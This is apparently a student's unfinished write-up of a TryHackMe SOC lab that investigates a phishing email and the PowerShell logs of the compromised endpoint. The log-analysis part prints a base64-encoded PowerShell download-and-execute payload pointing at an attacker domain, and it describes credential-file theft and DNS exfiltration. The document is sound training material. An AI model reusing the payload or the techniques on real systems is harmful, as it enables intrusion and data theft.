# [SIEM Triage for SOC]

**TryHackMe Path**: [SOC Level 1]  
**Lab Topic**: [Boogeyman 1]  
**Date Completed**: [05//2026]

---

## 🧠 Summary

> In this lab, I learned how to 

---

## 🎯 Objectives
- [ ] 
      
---

## 🧰 Tools Used
- THM AttackBox
- 

---

## 📊 Analysis & Screenshots

*** [Email Analysis] Look at that headers! ***

> In this room, starting with this section, i had to answer a few questions related to analyzing an email which contained a malicious document that compromised Julianna's
workstation. I first discovered that the email address used to send the phishing email was "agriffin@bpakcaging.xyz," then discovered the email address of the victim to be
"julianne.westcott@hotmail.com."
>
> <img width="605" height="288" alt="1" src="https://github.com/user-attachments/assets/b77ceacf-0b70-4072-95e5-49b2eee671a1" />
> <img width="510" height="255" alt="2" src="https://github.com/user-attachments/assets/792ad0cf-f018-42f9-9434-39ffd2d36f4b" />
> <img width="771" height="577" alt="3" src="https://github.com/user-attachments/assets/3401ea4c-c0f3-4206-908a-4c5ef1835237" />

> Moving on, based on the DKIM-Signature and List-Unsubscribe headers, the name of the third party mail relay service used by the attacker was determined to be "elasticemail."
>
> <img width="925" height="580" alt="4" src="https://github.com/user-attachments/assets/7b190fd2-6ea8-4175-a8f7-289f4d4f6499" />
> <img width="1398" height="403" alt="5" src="https://github.com/user-attachments/assets/68603430-f572-426a-bb06-594dadee7db2" />
> <img width="1001" height="420" alt="6" src="https://github.com/user-attachments/assets/53ed781d-dc89-41d0-adcb-83a37ad68b51" />

> I then retrieved the name of the file inside of the encrypted attachment to be "Invoice_20230103.lnk" by using the password "Invoice2023!" to decrypt the encrypted
attachment.
>
> <img width="693" height="458" alt="7" src="https://github.com/user-attachments/assets/1fdebcd3-2b02-4f69-a0cb-b86a569e4163" />
> <img width="556" height="192" alt="8" src="https://github.com/user-attachments/assets/cbb606e6-efef-41b8-9349-c16ea8627b66" />
> <img width="707" height="341" alt="9" src="https://github.com/user-attachments/assets/282ecb4c-7779-46eb-ac13-5952adec872d" />
> <img width="637" height="365" alt="10" src="https://github.com/user-attachments/assets/8c31cb09-0e4d-4343-b187-624694b42c6f" />
> <img width="599" height="324" alt="11" src="https://github.com/user-attachments/assets/41493203-755b-4567-a1c4-5d010288f09d" />

> For the last question, by using the lnkparse tool i discovered the encoded payload in the Command Line Arguments field to be:
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
for the "Invoice_20230103.lnk" file.
>
> <img width="483" height="277" alt="12" src="https://github.com/user-attachments/assets/bc029ecf-735c-4548-af8d-839a076efdc0" />
> <img width="857" height="151" alt="13" src="https://github.com/user-attachments/assets/d90d9a14-0b41-48f9-96b9-4a155a78c832" />
> <img width="1497" height="188" alt="14" src="https://github.com/user-attachments/assets/14148232-a97d-4f24-b269-db9d4970b698" />

*** [Endpoint Security] Are you sure that's an invoice ***

> Moving on to this section, i had to continue the investigation further by answering some questions related to analyzing the Powershell logs to uncover the potential impact of the
attack. After using the command synthax:
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq
I was able to retrieve the domains used by the attacker for file hosting and C2 to be "cdn.bpakcaging.xyz, & files.bpakcaging.xyz."
>
> <img width="1269" height="603" alt="15" src="https://github.com/user-attachments/assets/ab3ba05c-1fbf-4680-9879-d301bdf42bef" />

> I then identified the name of the enumeration tool downloaded by the attacker to be "seatbelt."
>
> <img width="855" height="408" alt="16" src="https://github.com/user-attachments/assets/c7cff989-e128-4a98-a080-a02682c946ae" />

> Then i discovered the full file path of the file accessed by the attacker using the downloaded sq3.exe binary by modifying the previous command syntax to:
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq | grep -e 'sq3.exe' -e 'cd'
which displayed "C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite."
>
> <img width="1501" height="164" alt="17" src="https://github.com/user-attachments/assets/b9c3c61a-111c-4486-84aa-b6a739452a8b" />

> I identified the software the uses the file in Q3 to be "Microsoft Sticky Notes."
>
> <img width="726" height="313" alt="18" src="https://github.com/user-attachments/assets/38590f3e-4ae4-4a65-afab-ee1b66811d27" />

> The name of the extracted file was identified as "protected_data.kdbx," this type of file is considered to be a "keepass" file as it uses the ".kdbx" extension.
>
> <img width="722" height="311" alt="19" src="https://github.com/user-attachments/assets/baf221f2-1b6f-4c99-8f49-fd2886f6fd51" />
> <img width="647" height="297" alt="20" src="https://github.com/user-attachments/assets/95253790-19b5-40c0-8bdc-3f4db622c562" />

> To figure out the encoding used during the exfiltration attempt of the sensitive file, i used the command syntax:
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq
which returned the encoding to be "hex," along with the tool used which was "nslookup."
>
> <img width="508" height="318" alt="21" src="https://github.com/user-attachments/assets/604ecb9b-ae66-406b-9d74-95dcb3ec55c8" />
> <img width="645" height="348" alt="22" src="https://github.com/user-attachments/assets/01baed77-0385-482c-89b0-eaaa5104b071" />















--- 

## Reflection

> This lab strengthened my ability to 
